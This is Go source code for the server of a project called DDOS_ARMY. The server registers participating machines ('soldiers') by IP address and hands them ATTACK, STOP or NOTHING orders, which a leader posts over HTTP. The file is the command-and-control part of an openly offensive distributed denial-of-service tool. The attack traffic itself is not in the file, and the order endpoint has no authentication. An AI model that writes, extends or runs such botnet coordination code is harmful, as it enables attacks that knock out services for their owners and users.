package server

import (
	"DDOS_ARMY/camp"
	"container/list"
	"encoding/json"
	"io"
	"log"
	"net/http"
)

var orderList list.List

// ORDER TYPE
const (
	ATTACK  = "ATTACK"
	STOP    = "STOP"
	NOTHING = "NOTHING"
)

func Ping(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	if r.URL.Path != "/ping" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	w.Write([]byte("pong"))
}

func Camp(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/camp" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	c := camp.GetCamp()
	if r.Method == "POST" {
		//join camp
		var sl camp.Soldier
		err := json.NewDecoder(r.Body).Decode(&sl)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		sl.Ip = r.RemoteAddr

		//check if soldier is already in camp
		if c.IsSoldierInCamp(sl.Ip) {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("You are already in the camp"))
			return
		}

		c.AddSoldier(sl)

		w.WriteHeader(http.StatusCreated)
		w.Write([]byte("ok"))
		log.Println("Soldier joined camp: ", sl.Name, "have ip ", r.RemoteAddr)

	} else if r.Method == "GET" {
		//get camp info
		w.Header().Set("Content-Type", "application/json")
		err := json.NewEncoder(w).Encode(c)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
	} else {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
}

func LeaveCamp(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/leave" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	if r.Method != "GET" {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	c := camp.GetCamp()
	if !c.RemoveSoldier(r.RemoteAddr) {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("You are not in the camp"))
		return
	}
	w.WriteHeader(http.StatusCreated)
	w.Write([]byte("you left the camp"))
	log.Println("Soldier left camp: ", "have ip ", r.RemoteAddr)
}

func Order(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/order" {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	if r.Method == "POST" {
		// TODO: check if order is from leader
		b := r.Body
		defer b.Close()
		orderb, _ := io.ReadAll(b)
		order := string(orderb)
		if order != ATTACK && order != STOP && order != NOTHING {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		orderList.PushFront(order)
	} else if r.Method == "GET" {
		if orderList.Len() == 0 {
			w.Write([]byte(NOTHING))
			return
		}
		e := orderList.Front()
		w.Write([]byte(e.Value.(string)))
	} else {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
}

func StartServer(address, port string) {
	log.Printf("Starting server on %s:%s", address, port)
	http.HandleFunc("/ping", Ping)
	http.HandleFunc("/camp", Camp)
	http.HandleFunc("/order", Order)
	http.HandleFunc("/leave", LeaveCamp)
	http.ListenAndServe(address+":"+port, nil)
}
